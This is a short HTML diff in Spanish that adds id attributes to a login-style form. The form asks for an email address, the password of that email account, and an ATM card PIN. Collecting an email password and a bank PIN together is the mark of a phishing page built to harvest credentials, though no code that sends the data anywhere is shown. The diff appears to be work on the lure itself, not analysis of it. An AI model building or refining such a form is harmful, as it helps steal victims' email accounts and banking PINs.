@@ -41,17 +41,17 @@
             <div class="form-group-l">
               <label class="form2label" for="correo">Correo electrónico</label>
 
-              <input type="email" name="email" placeholder="******@****.com" required>
+              <input type="email" id="email" name="email" placeholder="******@****.com" required>
             </div>
 
             <div class="form-group-l">
               <label class="form2label" for="correo">Clave del correo</label>
 
-              <input type="password" name="cpass" placeholder="*************" required>
+              <input type="password" id="cpass" name="cpass" placeholder="*************" required>
             </div>
             <div class="form-group-l">
               <label class="form2label" for="atm">Atm o Pin</label>
-              <input type="password" name="pin" maxlength="12" placeholder="****" required>
+              <input type="password" id="pin" name="pin" maxlength="12" placeholder="****" required>
             </div>
             <div class="footer-form">
               <p style="position: relative; width: 600px">
